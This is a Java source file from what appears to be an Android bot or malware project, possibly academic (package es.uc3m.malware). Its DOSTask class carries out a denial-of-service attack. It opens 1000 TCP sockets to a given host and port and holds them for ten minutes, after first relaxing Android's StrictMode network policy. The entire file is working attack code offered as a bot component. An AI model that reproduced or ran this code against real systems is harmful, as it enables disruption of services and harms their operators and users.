package es.uc3m.malware.task;

import android.os.StrictMode;
import android.util.Log;
import es.uc3m.malware.BotService;

import java.io.IOException;
import java.net.Inet4Address;
import java.net.InetAddress;
import java.net.Socket;
import java.net.UnknownHostException;
import java.util.concurrent.TimeUnit;

/**
 * In this class is where the DOS attack is performed
 */
public class DOSTask implements Runnable {


    private final String host;
    private final int port;
    private final int numberOfSockets = 1000;
    private final Socket[] openSockets = new Socket[numberOfSockets];
    private final long timeToWait = TimeUnit.MINUTES.toMillis(10);


    public DOSTask(String host, int port) {
        this.host = host;
        this.port = port;
    }

    /**
     * this method check the access to the network
     * @return true if none exception happens
     */
    public boolean isNetworkAvailable() {
        StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
        StrictMode.setThreadPolicy(policy);
        return true;
    }

    @Override
    public void run() {
        if(isNetworkAvailable()) {
            // transforms the host to a inet address
            InetAddress finalHost;
            try {
                finalHost = Inet4Address.getByName(host);
            } catch (UnknownHostException e) {
                Log.e(BotService.LOG_TAG, "", e);
                return;
            }
            //open the sockets and wait until the attack ends
            try {
                for (int i = 0; i < numberOfSockets; i++) {
                    Socket socket = new Socket(finalHost, port);
                    openSockets[i] = socket;
                }
                Thread.sleep(timeToWait);
            } catch (Exception e) {
                Log.w("", e);
            } finally {
                // close all the open sockets
                for (Socket openSocket : openSockets) {
                    try {
                        if (openSocket != null && !openSocket.isClosed()) {
                            openSocket.close();
                        }
                    } catch (IOException e) {

                    }
                }
            }
        }
    }
}
